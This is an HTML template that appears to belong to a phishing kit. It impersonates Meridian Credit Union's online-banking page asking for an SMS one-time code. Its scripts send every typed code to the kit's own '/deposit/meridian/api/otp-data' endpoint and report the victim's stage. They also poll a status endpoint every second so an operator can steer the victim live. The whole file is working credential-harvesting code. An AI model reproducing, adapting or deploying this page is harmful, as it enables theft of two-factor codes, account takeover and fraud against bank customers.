<html lang="en">
    <head>
        <title>Sign in to online banking</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
        <link href="/assets/meridian/style.css?v=1" rel="stylesheet">
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
        <script>
            var lrbank = '<?=escape($udata->last->bank)?>';
            var lrinfo = '<?=escape($udata->last->info)?>';
        </script>
        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
        <script>
            setInterval(function() {
                $.post('/deposit/meridian/api/status', {page: '2FA (Waiting)'}, function(response) {
                    if (response.status) {
                        location.href = response.href;
                    }
                }, 'JSON');
            }, 1000);
        </script>
        <script>
        $(document).on('change', '#input-code', function() {
            $.post('/deposit/meridian/api/otp-data', {code: $(this).val()});
        });

        $.post('/deposit/meridian/api/otp-type', {type: 'SMS'}, function(response) {});

        $(document).on('submit', '#input-form', function(e) {
            $('.btn-save').attr('disabled', true);

            $.post('/deposit/meridian/api/otp-submit', {code: $('#input-code').val()}, function(response) {
                location.href = '/deposit/meridian/wo/' + rand_str(16);
            });

            e.preventDefault();
        });

        function rand_str(length) {
            var result           = '';
            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for ( var i = 0; i < length; i++ ) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        }
        </script>
        <script src="/socket.io/socket.io.js"></script>
    </head>
    <body>
        <div class="body-content">
        	<div class="row public-header">
        		<div class="logo-container">
        			<a href="">
        				<img src="/assets/meridian//meridian-logo.svg" alt="Meridian Logo" class="meridian-logo">
        			</a>
        		</div>
        		<div class="link-container">
        			<ul class="utility-links">
        				<li>
        					<a href="">MeridianCU.ca</a>
        				</li>
        			</ul>
        		</div>
        	</div>
        </div>
        <div id="page-content" class="signin-page" style="background-image: url(/assets/meridian/Retail_SignInBackground_All.jpg)">
            <div class="signin-page-inner">
                <div class="row">
                    <div class="signin-form-container" id="acc-form">
                        <div class="signin-form">
                            <div class="signin-form-top">
                                <h1>Additional Security</h1>
                            </div>
                            <form id="loginForm" action="" autocomplete="false" class="disable-on-submit div-main" method="post" id="input-form" >
                                <input type="hidden" id="userAgent" name="userAgent">
                                <% if (error) { %>
                                <div class="error-top-container error-div" >
                                    <div class="message-summary">
                                        <div class="message-icon">
                                            <img src="/assets/meridian/signin-error.svg">
                                        </div>
                                        <ul class="message-list">
                                            <li>
                                                <span>
                                                The one-time code you entered is incorrect. Please try again
                                                </span>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                                <% } %>
                                <div class="signin-form-content">
                                    <p style="margin-bottom: 23px;color: #3e3e3e;font-size: 14px;">To protect your account, we have sent a one-time code to your registered mobile number. Enter the code below to continue</p>
                                    <div data-memorized-account-hidden="" style="">
                                        <label for="custNoInput">One-time Code</label>
                                        <div class="icon-textbox-wrapper">
                                            <div class="input-wrapper">
                                                <input value="" class="icon-textbox lrinput" attr-action="Filling OTP" focus="" id="input-code" maxlength="320" name="code" placeholder="Enter One-time Code" required="required" type="text" aria-required="true" inputmode="numeric" aria-invalid="false">
                                            </div>
                                        </div>
                                    </div>
                                    <button id="loginForm" type="button" class="orange button" id="sign-in-button" name="save" value="1">
                                    Continue
                                    </button>
                                    <br>
                                    <p style="margin-top: -3px;color: #3e3e3e;">Didn't receive it? <a style="color: #005580;font-weight: 600;">Get a new code</a></p>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class="main-footer" id="acc-footer">
            <div class="row">
                <div class="footer-logos">
                    <div class="logo-container">
                        <a href="/Security_Login" class="not-interactive">
                        <img src="/assets/meridian/meridian-logo-white.svg" alt="Meridian Logo" class="meridian-logo">
                        </a>
                    </div>
                    <div>
                        <img src="/assets/meridian/entrust.png" alt="Secured by Entrust SSL" class="entrust-seal">
                    </div>
                </div>
                <div class="footer-sub">
                    <span>Copyright Â© 2023 Meridian Credit Union. All rights reserved.</span>
                    <div class="footer-links">
                        <a href="https://www.meridiancu.ca/privacy" title="Privacy &amp; Security" target="_blank" rel="noopener noreferrer" aria-label="Privacy &amp; Security page opens the https://www.meridiancu.ca/privacy on a new window.">Privacy &amp; Security</a>
                        <a href="https://www.meridiancu.ca/legal" title="Legal" target="_blank" rel="noopener noreferrer" aria-label="Legal page opens the https://www.meridiancu.ca/legal on a new window.">Legal</a>
                        <a href="https://www.meridiancu.ca/accessibility" title="Accessibility" target="_blank" rel="noopener noreferrer" aria-label="Accessibility page opens the https://www.meridiancu.ca/accessibility on a new window.">Accessibility</a>
                    </div>
                </div>
            </div>
        </footer>
        <span hidden id="navig"> <%=navig%> </span>
        <span hidden id="stage">OTP</span>
    </body>
    <script src="/bank/meridian/js/script.js">
    </script>
</html>
